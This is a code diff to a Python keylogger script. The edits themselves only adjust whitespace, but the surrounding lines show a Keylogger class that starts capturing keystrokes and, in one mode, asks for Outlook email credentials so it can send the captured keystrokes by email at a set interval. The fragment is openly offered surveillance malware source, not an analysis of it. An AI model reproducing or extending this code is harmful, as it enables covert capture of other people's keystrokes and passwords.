@@ -16,6 +16,7 @@ while valid == 0:
     else:
         print('Wrong answer, please type correctly')
 
+
 class Keylogger:
     def __init__(self, interval, method):
         self.interval = interval
@@ -101,8 +102,9 @@ class Keylogger:
         print(f"{datetime.now()} - Started keylogging")
         keyboard.wait()
 
+
 if __name__ == "__main__":
-    if repMethod == 'email': 
+    if repMethod == 'email':
         email = input("Your email (Outlook): ")
         passwd = input("Your password (Outlook): ")
         keylogger = Keylogger(interval=reportTimer, method='email')
